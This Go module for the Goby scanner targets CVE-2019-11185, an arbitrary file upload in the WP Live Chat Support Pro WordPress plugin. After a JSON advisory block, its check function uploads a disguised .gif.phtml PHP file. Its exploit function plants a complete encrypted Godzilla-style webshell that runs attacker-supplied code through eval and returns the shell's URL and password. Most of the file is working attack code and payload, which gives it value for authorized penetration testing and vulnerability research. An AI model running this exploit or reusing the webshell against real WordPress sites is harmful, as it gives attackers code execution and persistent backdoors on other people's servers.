package exploits

import (
	"crypto/md5"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WordPress WP Live Chat Support Pro Plugin remote_upload Api Arbitrary File Upload Vulnerability (CVE-2019-11185)",
    "Description": "<p>WordPress is a blogging platform developed by the WordPress Foundation using the PHP language. The platform supports setting up personal blog sites on PHP and MySQL servers. WP Live Chat Support Pro plugin is one of the live chat plugins used in it.</p><p>A code issue vulnerability exists in the WordPress WP Live Chat Support Pro plugin 8.0.26 and earlier. The vulnerability arises from an improper design or implementation problem in the code development process of the network system or product.</p>",
    "Impact": "<p>WordPress WP Live Chat Support Pro Plugin &lt; 8.0.26 Arbitrary File Upload Vulnerability</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch:</p><p><a href=\"https://wordpress.org/plugins/wp-live-chat-support/#developers\">https://wordpress.org/plugins/wp-live-chat-support/#developers</a></p>",
    "Product": "wp-live-chat-support",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "WordPress WP Live Chat Support Pro 插件 remote_upload 接口任意文件上传漏洞（CVE-2019-11185）",
            "Product": "wp-live-chat-support",
            "Description": "<p>WordPress是WordPress基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。WP Live Chat Support Pro plugin是使用在其中的一个实时聊天插件。</p><p>WordPress WP Live Chat Support Pro插件8.0.26及之前版本中存在代码问题漏洞。该漏洞源于网络系统或产品的代码开发过程中存在设计或实现不当的问题。</p>",
            "Recommendation": "<p><span style=\"color: var(--primaryFont-color);\">目前厂商已发布升级补丁以修复漏洞，补丁获取链接：</span><br><a href=\"https://codecanyon.net/item/fancy-product-designer-woocommercewordpress/6318393\"></a></p><p><a href=\"https://wordpress.org/plugins/wp-live-chat-support/#developers\">https://wordpress.org/plugins/wp-live-chat-support/#developers</a></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "WordPress WP Live Chat Support Pro Plugin remote_upload Api Arbitrary File Upload Vulnerability (CVE-2019-11185)",
            "Product": "wp-live-chat-support",
            "Description": "<p>WordPress is a blogging platform developed by the WordPress Foundation using the PHP language. The platform supports setting up personal blog sites on PHP and MySQL servers. WP Live Chat Support Pro plugin is one of the live chat plugins used in it.</p><p>A code issue vulnerability exists in the WordPress WP Live Chat Support Pro plugin 8.0.26 and earlier. The vulnerability arises from an improper design or implementation problem in the code development process of the network system or product.</p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch:</p><p><a href=\"https://wordpress.org/plugins/wp-live-chat-support/#developers\">https://wordpress.org/plugins/wp-live-chat-support/#developers</a></p>",
            "Impact": "<p>WordPress WP Live Chat Support Pro Plugin &lt; 8.0.26 Arbitrary File Upload Vulnerability</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": "body=\"/wp-content/plugins/wp-live-chat-support/\"",
    "GobyQuery": "body=\"/wp-content/plugins/wp-live-chat-support/\"",
    "Author": "sharecast",
    "Homepage": "https://wordpress.org/plugins/wp-live-chat-support/",
    "DisclosureDate": "2019-05-07",
    "References": [
        "https://wpscan.com/vulnerability/9320"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2019-11185"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-201906-033"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10364"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/wp-json/wp_live_chat_support/v1/remote_upload"
			randomStr := goutils.RandomHexString(6)
			fileName := fmt.Sprintf("%s.gif.phtml", goutils.RandomHexString(8))
			shell := fmt.Sprintf("GIF89a<?php echo md5('%s');unlink(__FILE__);?>", randomStr)
			postData := fmt.Sprintf(`--01f41cc9fb3144325ffb56bfb900037a
Content-Disposition: form-data; name="timestamp"
1528969272366
--01f41cc9fb3144325ffb56bfb900037a
Content-Disposition: form-data; name="file"; filename="%s"
Content-Type: image/gif
%s
--01f41cc9fb3144325ffb56bfb900037a--`, fileName, shell)
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=01f41cc9fb3144325ffb56bfb900037a")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Data = postData
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, ".phtml") {
					regRule := regexp.MustCompile(`"response":"(.*?.phtml)"`)
					shellUrl := strings.Replace(regRule.FindAllStringSubmatch(resp.Utf8Html, -1)[0][1], "\\", "", -1)
					if resp, err := httpclient.SimpleGet(shellUrl); err == nil {
						return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, fmt.Sprintf("%x", md5.Sum([]byte(randomStr))))
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/wp-json/wp_live_chat_support/v1/remote_upload"
			fileName := fmt.Sprintf("%s.gif.phtml", goutils.RandomHexString(8))
			shell := `GIF89a<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='pass';
$payloadName='payload';
$key='3c6e0b8a9c15224a';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}`
			postData := fmt.Sprintf(`--01f41cc9fb3144325ffb56bfb900037a
Content-Disposition: form-data; name="timestamp"
1528969272366
--01f41cc9fb3144325ffb56bfb900037a
Content-Disposition: form-data; name="file"; filename="%s"
Content-Type: image/gif
%s
--01f41cc9fb3144325ffb56bfb900037a--`, fileName, shell)
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=01f41cc9fb3144325ffb56bfb900037a")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Data = postData
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, ".phtml") {
					regRule := regexp.MustCompile(`"response":"(.*?.phtml)"`)
					shellUrl := strings.Replace(regRule.FindAllStringSubmatch(resp.Utf8Html, -1)[0][1], "\\", "", -1)
					if resp, err := httpclient.SimpleGet(shellUrl); err == nil {
						if resp.StatusCode == 200 {
							expResult.Success = true
							shellInfo := fmt.Sprintf("godzilla webshell url: %s,pass:pass,key:key", shellUrl)
							expResult.Output = shellInfo
						}
					}
				}
			}
			return expResult
		},
	))
}
